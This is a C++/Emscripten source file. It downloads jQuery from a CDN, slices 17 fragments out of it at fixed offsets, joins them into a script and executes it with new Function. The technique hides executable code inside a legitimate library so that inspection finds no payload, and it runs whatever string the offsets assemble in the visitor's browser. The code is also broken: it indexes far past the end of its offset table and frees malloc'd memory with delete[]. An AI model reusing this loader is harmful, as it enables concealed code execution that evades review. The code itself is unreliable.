#include <emscripten.h>
#include <string>
#include <iostream>
#include <sstream>

using namespace std;

EM_JS(void, run_code, (const char* str), {
     new Function(UTF8ToString(str))();
});

EM_JS(char *, get_jquery, (), {
    var request = new XMLHttpRequest();
    request.open('GET', 'https://code.jquery.com/jquery-3.4.1.min.js', false);  // `false` makes the request synchronous
    request.send(null);

    if (request.status === 200) {
        var text = request.responseText;
        var lengthBytes = lengthBytesUTF8(text) + 1;
        var stringOnWasmHeap = _malloc(lengthBytes);
        stringToUTF8(text, stringOnWasmHeap, lengthBytes);
        return stringOnWasmHeap;
    } else {
        return null;
    }
});


int main() {
    int lenght = 17;
    int *idxs_table = new int[2*17];
    idxs_table[0] = 519;	idxs_table[17 + 0] = 2;
    idxs_table[1] = 496;	idxs_table[17 + 1] = 3;
    idxs_table[2] = 4410;	idxs_table[17 + 2] = 2;
    idxs_table[3] = 46910;	idxs_table[17 + 3] = 2;
    idxs_table[4] = 10220;	idxs_table[17 + 4] = 3;
    idxs_table[5] = 1539;	idxs_table[17 + 5] = 3;
    idxs_table[6] = 30966;	idxs_table[17 + 6] = 3;
    idxs_table[7] = 13168;	idxs_table[17 + 7] = 2;
    idxs_table[8] = 52831;	idxs_table[17 + 8] = 2;
    idxs_table[9] = 6078;	idxs_table[17 + 9] = 3;
    idxs_table[10] = 519;	idxs_table[17 + 10] = 2;
    idxs_table[11] = 55320;	idxs_table[17 + 11] = 2;
    idxs_table[12] = 38;	idxs_table[17 + 12] = 2;
    idxs_table[13] = 114;	idxs_table[17 + 13] = 2;
    idxs_table[14] = 34;	idxs_table[17 + 14] = 1;
    idxs_table[15] = 4320;	idxs_table[17 + 15] = 1;
    idxs_table[16] = 22;	idxs_table[17 + 16] = 1;


    char* tmp = get_jquery();
    if (!tmp) return 1;
    string data(tmp);

    ostringstream oss("");
    for (int temp = 0; temp < lenght; temp++)
        oss << data.substr(idxs_table[temp], idxs_table[554 + temp]);
    run_code(oss.str().c_str());

    delete[] idxs_table;
    delete[] tmp; 
}